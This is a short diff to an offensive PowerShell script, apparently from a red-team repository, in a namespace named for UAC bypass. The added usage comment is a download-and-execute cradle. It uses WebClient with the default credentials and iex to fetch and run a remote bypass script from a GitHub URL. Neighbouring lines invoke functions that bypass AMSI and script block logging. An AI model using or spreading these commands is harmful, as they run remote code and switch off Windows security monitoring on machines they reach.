@@ -193,6 +193,7 @@ namespace UACBypass
 "@;
 
 # Usage
+# $browser = New-Object System.Net.WebClient; $browser.Proxy.Credentials =[System.Net.CredentialCache]::DefaultNetworkCredentials; iex($browser.downloadstring("https://raw.githubusercontent.com/d0nkeys/redteam/master/code-execution/Invoke-Bypass.ps1"));
 # iex "$(Get-Command 'Invoke-Bypass-*-AMSI')"
 # iex "$(Get-Command 'Invoke-Bypass-*-AMSI2')"
 # iex "$(Get-Command 'Invoke-Bypass-*-ScriptBlockLog')"
